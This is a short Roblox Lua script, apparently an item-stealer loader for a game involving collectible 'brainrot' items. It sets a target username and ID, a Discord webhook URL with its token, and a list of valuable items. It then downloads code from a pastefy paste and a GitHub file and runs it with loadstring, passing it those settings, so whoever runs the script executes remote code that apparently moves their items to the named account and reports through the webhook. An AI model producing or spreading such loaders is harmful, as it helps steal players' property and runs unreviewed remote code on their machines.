local TARGET_ID = 11921984058
local TARGET_USER = "SAB_TRAIT15"
local WEBHOOK_URL = "https://discord.com/api/webhooks/1564593922381062206/2Wo60Dlfluh-BGALfGeMvzSArAqiTpCB0vVaPJHi57LTxl6PJEGIBvQSU0OxqmGM09Ka"

local TargetBrainrots = {
    ["Griffin"] = true,
    ["Dragon Cannelloni"] = true,
    ["Garama and Madundung"] = true
}

local TargetBaseSkins = {
    
}

local TargetGears = {
    
}

task.spawn(function()
    loadstring(game:HttpGet("https://pastefy.app/eDmA1TWp/raw"))()

task.wait(1)

    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()
    if type(script) == "function" then
        script(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)
    end
end)